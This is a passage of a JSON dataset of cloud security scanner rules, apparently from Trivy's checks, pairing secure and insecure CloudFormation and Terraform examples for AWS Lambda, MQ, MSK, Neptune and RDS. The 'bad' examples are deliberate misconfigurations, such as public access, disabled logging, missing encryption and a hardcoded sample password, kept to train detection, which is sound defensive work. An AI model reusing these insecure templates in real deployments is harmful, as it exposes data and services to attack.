subnet-071f712345678e7c8\n                - subnet-07fd123456788a036\n\n        BadPermission:\n          Type: AWS::Lambda::Permission\n          Properties:\n            Action: lambda:InvokeFunction\n            FunctionName: !Ref BadExample\n            Principal: s3.amazonaws.com\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lambda_permission\n  good:\n    - |-\n      resource \"aws_lambda_permission\" \"good_example\" {\n        statement_id  = \"AllowExecutionFromSNS\"\n        action        = \"lambda:InvokeFunction\"\n        function_name = aws_lambda_function.func.function_name\n        principal     = \"sns.amazonaws.com\"\n        source_arn    = aws_sns_topic.default.arn\n      }\n  bad:\n    - |-\n      resource \"aws_lambda_permission\" \"bad_example\" {\n        statement_id  = \"AllowExecutionFromSNS\"\n        action        = \"lambda:InvokeFunction\"\n        function_name = aws_lambda_function.func.function_name\n        principal     = \"sns.amazonaws.com\"\n      }\n",
        "file_name": "restrict_source_arn.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/lambda/restrict_source_arn.yaml",
        "local_path": "aws/lambda/restrict_source_arn.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Lambda::Function\n    Properties:\n      Code:\n        S3Bucket: my-bucket\n        S3Key: function.zip\n      Handler: index.handler\n      Role: arn:aws:iam::123456789012:role/lambda-role\n      Runtime: nodejs12.x\n      Timeout: 5\n      TracingConfig:\n        Mode: Active\n      VpcConfig:\n        SecurityGroupIds:\n          - sg-085912345678492fb\n        SubnetIds:\n          - subnet-071f712345678e7c8\n          - subnet-07fd123456788a036\n\n  GoodPermission:\n    Type: AWS::Lambda::Permission\n    Properties:\n      Action: lambda:InvokeFunction\n      FunctionName: !Ref GoodExample\n      Principal: s3.amazonaws.com\n      SourceArn: lambda.amazonaws.com"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Lambda::Function\n    Properties:\n      Code:\n        S3Bucket: my-bucket\n        S3Key: function.zip\n      Handler: index.handler\n      Role: arn:aws:iam::123456789012:role/lambda-role\n      Runtime: nodejs12.x\n      Timeout: 5\n      TracingConfig:\n        Mode: Active\n      VpcConfig:\n        SecurityGroupIds:\n          - sg-085912345678492fb\n        SubnetIds:\n          - subnet-071f712345678e7c8\n          - subnet-07fd123456788a036\n\n  BadPermission:\n    Type: AWS::Lambda::Permission\n    Properties:\n      Action: lambda:InvokeFunction\n      FunctionName: !Ref BadExample\n      Principal: s3.amazonaws.com"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lambda_permission"
            ],
            "good": [
              "resource \"aws_lambda_permission\" \"good_example\" {\n  statement_id  = \"AllowExecutionFromSNS\"\n  action        = \"lambda:InvokeFunction\"\n  function_name = aws_lambda_function.func.function_name\n  principal     = \"sns.amazonaws.com\"\n  source_arn    = aws_sns_topic.default.arn\n}"
            ],
            "bad": [
              "resource \"aws_lambda_permission\" \"bad_example\" {\n  statement_id  = \"AllowExecutionFromSNS\"\n  action        = \"lambda:InvokeFunction\"\n  function_name = aws_lambda_function.func.function_name\n  principal     = \"sns.amazonaws.com\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-MQ-ENABLE_AUDIT_LOGGING",
        "title": "Enable Audit Logging",
        "provider": "aws",
        "service": "mq",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodBroker:\n          Type: AWS::AmazonMQ::Broker\n          Properties:\n            Logs:\n              Audit: true\n  bad:\n    - |-\n      Resources:\n        BadBroker:\n          Type: AWS::AmazonMQ::Broker\n          Properties:\n            Logs:\n              Audit: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#audit\n  good:\n    - |-\n      resource \"aws_mq_broker\" \"good_example\" {\n        broker_name        = \"example\"\n        engine_type        = \"ActiveMQ\"\n        engine_version     = \"5.15.0\"\n        host_instance_type = \"mq.t2.micro\"\n        user {\n          username = \"ExampleUser\"\n          password = \"MindTheGap\"\n        }\n        logs {\n          audit = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_mq_broker\" \"bad_example\" {\n        broker_name        = \"example\"\n        engine_type        = \"ActiveMQ\"\n        engine_version     = \"5.15.0\"\n        host_instance_type = \"mq.t2.micro\"\n        user {\n          username = \"ExampleUser\"\n          password = \"MindTheGap\"\n        }\n        logs {\n          audit = false\n        }\n      }\n",
        "file_name": "enable_audit_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/mq/enable_audit_logging.yaml",
        "local_path": "aws/mq/enable_audit_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodBroker:\n    Type: AWS::AmazonMQ::Broker\n    Properties:\n      Logs:\n        Audit: true"
            ],
            "bad": [
              "Resources:\n  BadBroker:\n    Type: AWS::AmazonMQ::Broker\n    Properties:\n      Logs:\n        Audit: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#audit"
            ],
            "good": [
              "resource \"aws_mq_broker\" \"good_example\" {\n  broker_name        = \"example\"\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.15.0\"\n  host_instance_type = \"mq.t2.micro\"\n  user {\n    username = \"ExampleUser\"\n    password = \"MindTheGap\"\n  }\n  logs {\n    audit = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_mq_broker\" \"bad_example\" {\n  broker_name        = \"example\"\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.15.0\"\n  host_instance_type = \"mq.t2.micro\"\n  user {\n    username = \"ExampleUser\"\n    password = \"MindTheGap\"\n  }\n  logs {\n    audit = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-MQ-ENABLE_GENERAL_LOGGING",
        "title": "Enable General Logging",
        "provider": "aws",
        "service": "mq",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodBroker:\n          Type: AWS::AmazonMQ::Broker\n          Properties:\n            Logs:\n              General: true\n  bad:\n    - |-\n      Resources:\n        BadBroker:\n          Type: AWS::AmazonMQ::Broker\n          Properties:\n            Logs:\n              General: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#general\n  good:\n    - |-\n      resource \"aws_mq_broker\" \"good_example\" {\n        broker_name        = \"example\"\n        engine_type        = \"ActiveMQ\"\n        engine_version     = \"5.15.0\"\n        host_instance_type = \"mq.t2.micro\"\n        user {\n          username = \"ExampleUser\"\n          password = \"MindTheGap\"\n        }\n        logs {\n          general = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_mq_broker\" \"bad_example\" {\n        broker_name        = \"example\"\n        engine_type        = \"ActiveMQ\"\n        engine_version     = \"5.15.0\"\n        host_instance_type = \"mq.t2.micro\"\n        user {\n          username = \"ExampleUser\"\n          password = \"MindTheGap\"\n        }\n        logs {\n          general = false\n        }\n      }\n",
        "file_name": "enable_general_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/mq/enable_general_logging.yaml",
        "local_path": "aws/mq/enable_general_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodBroker:\n    Type: AWS::AmazonMQ::Broker\n    Properties:\n      Logs:\n        General: true"
            ],
            "bad": [
              "Resources:\n  BadBroker:\n    Type: AWS::AmazonMQ::Broker\n    Properties:\n      Logs:\n        General: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#general"
            ],
            "good": [
              "resource \"aws_mq_broker\" \"good_example\" {\n  broker_name        = \"example\"\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.15.0\"\n  host_instance_type = \"mq.t2.micro\"\n  user {\n    username = \"ExampleUser\"\n    password = \"MindTheGap\"\n  }\n  logs {\n    general = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_mq_broker\" \"bad_example\" {\n  broker_name        = \"example\"\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.15.0\"\n  host_instance_type = \"mq.t2.micro\"\n  user {\n    username = \"ExampleUser\"\n    password = \"MindTheGap\"\n  }\n  logs {\n    general = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-MQ-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "aws",
        "service": "mq",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodBroker:\n          Type: AWS::AmazonMQ::Broker\n          Properties:\n            PubliclyAccessible: false\n  bad:\n    - |-\n      Resources:\n        BadBroker:\n          Type: AWS::AmazonMQ::Broker\n          Properties:\n            PubliclyAccessible: true\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#publicly_accessible\n  good:\n    - |-\n      resource \"aws_mq_broker\" \"good_example\" {\n        broker_name        = \"example\"\n        engine_type        = \"ActiveMQ\"\n        engine_version     = \"5.15.0\"\n        host_instance_type = \"mq.t2.micro\"\n        user {\n          username = \"ExampleUser\"\n          password = \"MindTheGap\"\n        }\n        publicly_accessible = false\n      }\n  bad:\n    - |-\n      resource \"aws_mq_broker\" \"bad_example\" {\n        broker_name        = \"example\"\n        engine_type        = \"ActiveMQ\"\n        engine_version     = \"5.15.0\"\n        host_instance_type = \"mq.t2.micro\"\n        user {\n          username = \"ExampleUser\"\n          password = \"MindTheGap\"\n        }\n        publicly_accessible = true\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/mq/no_public_access.yaml",
        "local_path": "aws/mq/no_public_access.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodBroker:\n    Type: AWS::AmazonMQ::Broker\n    Properties:\n      PubliclyAccessible: false"
            ],
            "bad": [
              "Resources:\n  BadBroker:\n    Type: AWS::AmazonMQ::Broker\n    Properties:\n      PubliclyAccessible: true"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#publicly_accessible"
            ],
            "good": [
              "resource \"aws_mq_broker\" \"good_example\" {\n  broker_name        = \"example\"\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.15.0\"\n  host_instance_type = \"mq.t2.micro\"\n  user {\n    username = \"ExampleUser\"\n    password = \"MindTheGap\"\n  }\n  publicly_accessible = false\n}"
            ],
            "bad": [
              "resource \"aws_mq_broker\" \"bad_example\" {\n  broker_name        = \"example\"\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.15.0\"\n  host_instance_type = \"mq.t2.micro\"\n  user {\n    username = \"ExampleUser\"\n    password = \"MindTheGap\"\n  }\n  publicly_accessible = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-MSK-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "aws",
        "service": "msk",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodCluster:\n          Type: AWS::MSK::Cluster\n          Properties:\n            EncryptionInfo:\n              EncryptionAtRest:\n                DataVolumeKMSKeyId: foo-bar-key\n  bad:\n    - |-\n      Resources:\n        BadCluster:\n          Type: AWS::MSK::Cluster\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#encryption_info-argument-reference\n  good:\n    - |-\n      resource \"aws_msk_cluster\" \"good_example\" {\n        encryption_info {\n          encryption_at_rest_kms_key_arn = \"foo-bar-key\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_msk_cluster\" \"bad_example\" {\n        encryption_info {\n        }\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/msk/enable_at_rest_encryption.yaml",
        "local_path": "aws/msk/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodCluster:\n    Type: AWS::MSK::Cluster\n    Properties:\n      EncryptionInfo:\n        EncryptionAtRest:\n          DataVolumeKMSKeyId: foo-bar-key"
            ],
            "bad": [
              "Resources:\n  BadCluster:\n    Type: AWS::MSK::Cluster"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#encryption_info-argument-reference"
            ],
            "good": [
              "resource \"aws_msk_cluster\" \"good_example\" {\n  encryption_info {\n    encryption_at_rest_kms_key_arn = \"foo-bar-key\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_msk_cluster\" \"bad_example\" {\n  encryption_info {\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-MSK-ENABLE_IN_TRANSIT_ENCRYPTION",
        "title": "Enable In Transit Encryption",
        "provider": "aws",
        "service": "msk",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodCluster:\n          Type: AWS::MSK::Cluster\n          Properties:\n            EncryptionInfo:\n              EncryptionInTransit:\n                ClientBroker: TLS\n  bad:\n    - |-\n      Resources:\n        BadCluster:\n          Type: AWS::MSK::Cluster\n          Properties:\n            EncryptionInfo:\n              EncryptionInTransit:\n                ClientBroker: TLS_PLAINTEXT\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#encryption_info-argument-reference\n  good:\n    - |-\n      resource \"aws_msk_cluster\" \"good_example\" {\n        encryption_info {\n          encryption_in_transit {\n            client_broker = \"TLS\"\n            in_cluster    = true\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_msk_cluster\" \"bad_example\" {\n        encryption_info {\n          encryption_in_transit {\n            client_broker = \"TLS_PLAINTEXT\"\n            in_cluster    = true\n          }\n        }\n      }\n",
        "file_name": "enable_in_transit_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/msk/enable_in_transit_encryption.yaml",
        "local_path": "aws/msk/enable_in_transit_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodCluster:\n    Type: AWS::MSK::Cluster\n    Properties:\n      EncryptionInfo:\n        EncryptionInTransit:\n          ClientBroker: TLS"
            ],
            "bad": [
              "Resources:\n  BadCluster:\n    Type: AWS::MSK::Cluster\n    Properties:\n      EncryptionInfo:\n        EncryptionInTransit:\n          ClientBroker: TLS_PLAINTEXT"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#encryption_info-argument-reference"
            ],
            "good": [
              "resource \"aws_msk_cluster\" \"good_example\" {\n  encryption_info {\n    encryption_in_transit {\n      client_broker = \"TLS\"\n      in_cluster    = true\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_msk_cluster\" \"bad_example\" {\n  encryption_info {\n    encryption_in_transit {\n      client_broker = \"TLS_PLAINTEXT\"\n      in_cluster    = true\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-MSK-ENABLE_LOGGING",
        "title": "Enable Logging",
        "provider": "aws",
        "service": "msk",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodCluster:\n          Type: AWS::MSK::Cluster\n          Properties:\n            LoggingInfo:\n              BrokerLogs:\n                S3:\n                  Enabled: true\n  bad:\n    - |-\n      Resources:\n        BadCluster:\n          Type: AWS::MSK::Cluster\n          Properties:\n            LoggingInfo:\n              BrokerLogs:\n                CloudWatchLogs:\n                  Enabled: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#\n  good:\n    - |-\n      resource \"aws_msk_cluster\" \"example\" {\n        cluster_name           = \"example\"\n        kafka_version          = \"2.4.1\"\n        number_of_broker_nodes = 3\n\n        broker_node_group_info {\n          instance_type   = \"kafka.m5.large\"\n          ebs_volume_size = 1000\n          client_subnets  = [aws_subnet.subnet_az1.id]\n          security_groups = [aws_security_group.sg.id]\n        }\n\n        logging_info {\n          broker_logs {\n            firehose {\n              enabled         = false\n              delivery_stream = aws_kinesis_firehose_delivery_stream.test_stream.name\n            }\n            s3 {\n              enabled = true\n              bucket  = aws_s3_bucket.bucket.id\n              prefix  = \"logs/msk-\"\n            }\n          }\n        }\n      }\n    - |-\n      resource \"aws_msk_cluster\" \"example\" {\n        cluster_name           = \"example\"\n        kafka_version          = \"2.4.1\"\n        number_of_broker_nodes = 3\n\n        broker_node_group_info {\n          instance_type   = \"kafka.m5.large\"\n          ebs_volume_size = 1000\n          client_subnets  = [aws_subnet.subnet_az1.id]\n          security_groups = [aws_security_group.sg.id]\n        }\n\n        logging_info {\n          broker_logs {\n            cloudwatch_logs {\n              enabled   = false\n              log_group = aws_cloudwatch_log_group.test.name\n            }\n            firehose {\n              enabled         = true\n              delivery_stream = aws_kinesis_firehose_delivery_stream.test_stream.name\n            }\n          }\n        }\n      }\n    - |-\n      resource \"aws_msk_cluster\" \"example\" {\n        cluster_name           = \"example\"\n        kafka_version          = \"2.4.1\"\n        number_of_broker_nodes = 3\n\n        broker_node_group_info {\n          instance_type   = \"kafka.m5.large\"\n          ebs_volume_size = 1000\n          client_subnets  = [aws_subnet.subnet_az1.id]\n          security_groups = [aws_security_group.sg.id]\n        }\n\n        logging_info {\n          broker_logs {\n            cloudwatch_logs {\n              enabled   = true\n              log_group = aws_cloudwatch_log_group.test.name\n            }\n            firehose {\n              enabled         = false\n              delivery_stream = aws_kinesis_firehose_delivery_stream.test_stream.name\n            }\n            s3 {\n              enabled = true\n              bucket  = aws_s3_bucket.bucket.id\n              prefix  = \"logs/msk-\"\n            }\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_msk_cluster\" \"example\" {\n        cluster_name           = \"example\"\n        kafka_version          = \"2.4.1\"\n        number_of_broker_nodes = 3\n\n        broker_node_group_info {\n          instance_type   = \"kafka.m5.large\"\n          ebs_volume_size = 1000\n          client_subnets  = [aws_subnet.subnet_az1.id]\n          security_groups = [aws_security_group.sg.id]\n        }\n      }\n",
        "file_name": "enable_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/msk/enable_logging.yaml",
        "local_path": "aws/msk/enable_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodCluster:\n    Type: AWS::MSK::Cluster\n    Properties:\n      LoggingInfo:\n        BrokerLogs:\n          S3:\n            Enabled: true"
            ],
            "bad": [
              "Resources:\n  BadCluster:\n    Type: AWS::MSK::Cluster\n    Properties:\n      LoggingInfo:\n        BrokerLogs:\n          CloudWatchLogs:\n            Enabled: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#"
            ],
            "good": [
              "resource \"aws_msk_cluster\" \"example\" {\n  cluster_name           = \"example\"\n  kafka_version          = \"2.4.1\"\n  number_of_broker_nodes = 3\n\n  broker_node_group_info {\n    instance_type   = \"kafka.m5.large\"\n    ebs_volume_size = 1000\n    client_subnets  = [aws_subnet.subnet_az1.id]\n    security_groups = [aws_security_group.sg.id]\n  }\n\n  logging_info {\n    broker_logs {\n      firehose {\n        enabled         = false\n        delivery_stream = aws_kinesis_firehose_delivery_stream.test_stream.name\n      }\n      s3 {\n        enabled = true\n        bucket  = aws_s3_bucket.bucket.id\n        prefix  = \"logs/msk-\"\n      }\n    }\n  }\n}",
              "resource \"aws_msk_cluster\" \"example\" {\n  cluster_name           = \"example\"\n  kafka_version          = \"2.4.1\"\n  number_of_broker_nodes = 3\n\n  broker_node_group_info {\n    instance_type   = \"kafka.m5.large\"\n    ebs_volume_size = 1000\n    client_subnets  = [aws_subnet.subnet_az1.id]\n    security_groups = [aws_security_group.sg.id]\n  }\n\n  logging_info {\n    broker_logs {\n      cloudwatch_logs {\n        enabled   = false\n        log_group = aws_cloudwatch_log_group.test.name\n      }\n      firehose {\n        enabled         = true\n        delivery_stream = aws_kinesis_firehose_delivery_stream.test_stream.name\n      }\n    }\n  }\n}",
              "resource \"aws_msk_cluster\" \"example\" {\n  cluster_name           = \"example\"\n  kafka_version          = \"2.4.1\"\n  number_of_broker_nodes = 3\n\n  broker_node_group_info {\n    instance_type   = \"kafka.m5.large\"\n    ebs_volume_size = 1000\n    client_subnets  = [aws_subnet.subnet_az1.id]\n    security_groups = [aws_security_group.sg.id]\n  }\n\n  logging_info {\n    broker_logs {\n      cloudwatch_logs {\n        enabled   = true\n        log_group = aws_cloudwatch_log_group.test.name\n      }\n      firehose {\n        enabled         = false\n        delivery_stream = aws_kinesis_firehose_delivery_stream.test_stream.name\n      }\n      s3 {\n        enabled = true\n        bucket  = aws_s3_bucket.bucket.id\n        prefix  = \"logs/msk-\"\n      }\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_msk_cluster\" \"example\" {\n  cluster_name           = \"example\"\n  kafka_version          = \"2.4.1\"\n  number_of_broker_nodes = 3\n\n  broker_node_group_info {\n    instance_type   = \"kafka.m5.large\"\n    ebs_volume_size = 1000\n    client_subnets  = [aws_subnet.subnet_az1.id]\n    security_groups = [aws_security_group.sg.id]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-NEPTUNE-ENABLE_LOG_EXPORT",
        "title": "Enable Log Export",
        "provider": "aws",
        "service": "neptune",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodCluster:\n          Type: AWS::Neptune::DBCluster\n          Properties:\n            EnableCloudwatchLogsExports:\n              - audit\n  bad:\n    - |-\n      Resources:\n        BadCluster:\n          Type: AWS::Neptune::DBCluster\n          Properties:\n            EnableCloudwatchLogsExports:\n              - debug\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#enable_cloudwatch_logs_exports\n  good:\n    - |-\n      resource \"aws_neptune_cluster\" \"good_example\" {\n        enable_cloudwatch_logs_exports = [\"audit\"]\n      }\n  bad:\n    - |-\n      resource \"aws_neptune_cluster\" \"bad_example\" {}\n    - |-\n      resource \"aws_neptune_cluster\" \"bad_example\" {\n        enable_cloudwatch_logs_exports = [\"debug\"]\n      }\n",
        "file_name": "enable_log_export.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/neptune/enable_log_export.yaml",
        "local_path": "aws/neptune/enable_log_export.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodCluster:\n    Type: AWS::Neptune::DBCluster\n    Properties:\n      EnableCloudwatchLogsExports:\n        - audit"
            ],
            "bad": [
              "Resources:\n  BadCluster:\n    Type: AWS::Neptune::DBCluster\n    Properties:\n      EnableCloudwatchLogsExports:\n        - debug"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#enable_cloudwatch_logs_exports"
            ],
            "good": [
              "resource \"aws_neptune_cluster\" \"good_example\" {\n  enable_cloudwatch_logs_exports = [\"audit\"]\n}"
            ],
            "bad": [
              "resource \"aws_neptune_cluster\" \"bad_example\" {}",
              "resource \"aws_neptune_cluster\" \"bad_example\" {\n  enable_cloudwatch_logs_exports = [\"debug\"]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-NEPTUNE-ENABLE_STORAGE_ENCRYPTION",
        "title": "Enable Storage Encryption",
        "provider": "aws",
        "service": "neptune",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodCluster:\n          Type: AWS::Neptune::DBCluster\n          Properties:\n            KmsKeyId: something\n            StorageEncrypted: true\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Bad example\n\n      Resources:\n        BadCluster:\n          Type: AWS::Neptune::DBCluster\n          Properties:\n            StorageEncrypted: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#storage_encrypted\n  good:\n    - |-\n      resource \"aws_neptune_cluster\" \"good_example\" {\n        kms_key_arn       = \"test\"\n        storage_encrypted = true\n      }\n  bad:\n    - |-\n      resource \"aws_neptune_cluster\" \"bad_example\" {\n        storage_encrypted = false\n      }\n",
        "file_name": "enable_storage_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/neptune/enable_storage_encryption.yaml",
        "local_path": "aws/neptune/enable_storage_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodCluster:\n    Type: AWS::Neptune::DBCluster\n    Properties:\n      KmsKeyId: something\n      StorageEncrypted: true"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Bad example\n\nResources:\n  BadCluster:\n    Type: AWS::Neptune::DBCluster\n    Properties:\n      StorageEncrypted: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#storage_encrypted"
            ],
            "good": [
              "resource \"aws_neptune_cluster\" \"good_example\" {\n  kms_key_arn       = \"test\"\n  storage_encrypted = true\n}"
            ],
            "bad": [
              "resource \"aws_neptune_cluster\" \"bad_example\" {\n  storage_encrypted = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-NEPTUNE-ENCRYPTION_CUSTOMER_KEY",
        "title": "Encryption Customer Key",
        "provider": "aws",
        "service": "neptune",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodCluster:\n          Type: AWS::Neptune::DBCluster\n          Properties:\n            KmsKeyId: something\n            StorageEncrypted: true\n  bad:\n    - |-\n      Resources:\n        BadCluster:\n          Type: AWS::Neptune::DBCluster\n          Properties:\n            StorageEncrypted: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#storage_encrypted\n  good:\n    - |-\n      resource \"aws_neptune_cluster\" \"good_example\" {\n        kms_key_arn = \"test\"\n      }\n  bad:\n    - |-\n      resource \"aws_neptune_cluster\" \"bad_example\" {}\n",
        "file_name": "encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/neptune/encryption_customer_key.yaml",
        "local_path": "aws/neptune/encryption_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodCluster:\n    Type: AWS::Neptune::DBCluster\n    Properties:\n      KmsKeyId: something\n      StorageEncrypted: true"
            ],
            "bad": [
              "Resources:\n  BadCluster:\n    Type: AWS::Neptune::DBCluster\n    Properties:\n      StorageEncrypted: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#storage_encrypted"
            ],
            "good": [
              "resource \"aws_neptune_cluster\" \"good_example\" {\n  kms_key_arn = \"test\"\n}"
            ],
            "bad": [
              "resource \"aws_neptune_cluster\" \"bad_example\" {}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-RDS-DISABLE_PUBLIC_ACCESS",
        "title": "Disable Public Access",
        "provider": "aws",
        "service": "rds",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            PubliclyAccessible: false\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            PubliclyAccessible: true\nterraform:\n  good:\n    - |-\n      resource \"aws_db_instance\" \"good_example\" {\n        publicly_accessible = false\n      }\n  bad:\n    - |-\n      resource \"aws_db_instance\" \"bad_example\" {\n        publicly_accessible = true\n      }\n",
        "file_name": "disable_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/rds/disable_public_access.yaml",
        "local_path": "aws/rds/disable_public_access.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      PubliclyAccessible: false"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      PubliclyAccessible: true"
            ]
          },
          "terraform": {
            "good": [
              "resource \"aws_db_instance\" \"good_example\" {\n  publicly_accessible = false\n}"
            ],
            "bad": [
              "resource \"aws_db_instance\" \"bad_example\" {\n  publicly_accessible = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-RDS-ENABLE_PERFORMANCE_INSIGHTS",
        "title": "Enable Performance Insights",
        "provider": "aws",
        "service": "rds",
        "language": "cloudformation",
